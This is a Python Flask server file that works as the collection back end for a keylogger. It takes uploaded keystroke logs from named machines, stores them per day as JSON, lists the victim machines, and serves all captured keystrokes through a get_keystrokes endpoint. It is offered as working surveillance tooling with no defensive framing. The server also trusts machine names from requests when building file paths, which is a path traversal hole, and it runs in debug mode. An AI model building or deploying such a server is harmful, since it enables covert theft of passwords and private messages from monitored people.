import json
import os
from datetime import datetime

from flask import Flask, request, jsonify

app = Flask(__name__)

LOGS_DIR = "data"
os.makedirs(LOGS_DIR, exist_ok=True)


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.json
    machine_name = data.get("machine")
    log = data.get("data")

    if not machine_name or not log:
        return jsonify({"error": "Invalid Data"}), 400

    machine_dir = os.path.join(LOGS_DIR, machine_name)
    os.makedirs(machine_dir, exist_ok=True)

    log_file = os.path.join(machine_dir, f"{datetime.now().strftime('%Y-%m-%d')}.json")

    if not os.path.exists(log_file):
        with open(log_file, "w", encoding="utf-8") as file:
            json.dump({}, file)

    # Loading the json file into a dictionary.
    with open(log_file, "r", encoding="utf-8") as file:
        logs = json.load(file)
    logs.update(log)  # Merging the two dictionaries into one.

    # Updating the json file with the new data.
    with open(log_file, "w", encoding="utf-8") as file:
        json.dump(logs, file, indent=4, ensure_ascii=False)

    return jsonify({"massage": "Log received"}), 200


@app.route('/api/machines', methods=['GET'])
def list_machines():
    """Returns a list of all machine names (directories in the 'data' folder)."""
    if not os.path.exists(LOGS_DIR):
        return jsonify({"machines": []})  # Return empty if no data directory exists

    machines = [
        d for d in os.listdir(LOGS_DIR)
        if os.path.isdir(os.path.join(LOGS_DIR, d))  # Ensure it's a directory
    ]

    return jsonify({"machines": machines}), 200


@app.route('/api/get_keystrokes', methods=['GET'])
def get_key_strokes_by_machine():
    machine_name = request.args.get("machine")

    if not machine_name:
        return jsonify({"error": "Missing 'machine' query parameter."}), 400

    machine_dir = os.path.join(LOGS_DIR, machine_name)
    if not os.path.exists(machine_dir):
        return jsonify({"error": f"Machine {machine_name} not found"}), 404
    logs = {}
    for file in os.listdir(machine_dir):
        file_path = os.path.join(machine_dir, file)
        if os.path.isfile(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                log = json.load(f)
                logs.update(log)
    return jsonify({"machine": machine_name, "logs": logs}), 200


if __name__ == "__main__":
    app.run(debug=True)
